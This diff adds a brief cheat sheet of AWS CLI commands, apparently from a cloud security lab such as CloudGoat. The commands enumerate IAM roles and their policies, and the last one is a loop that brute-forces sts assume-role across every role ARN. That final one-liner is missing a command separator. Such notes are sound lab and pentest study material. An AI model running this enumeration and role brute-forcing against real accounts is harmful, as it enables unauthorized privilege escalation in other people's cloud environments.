@@ -1,0 +1,13 @@
+# List roles matching prefix:
+aws iam list-roles | grep cg-
+
+# List role inline policies:
+aws iam list-role-policies --role-name <roleName>
+
+# List attached role policies:
+aws iam list-attached-role-policies --role-name <roleName>
+
+
+
+# Brute force assume-role by exporting all role ARNs and brute force the assume-role action:
+aws iam list-roles --query 'Roles[].Arn' | jq -r '.[]' >> rolearns.txt while read r; do echo $r; aws sts assume-role --role-arn $r --role-session-name awshax; done < rolearns.txt
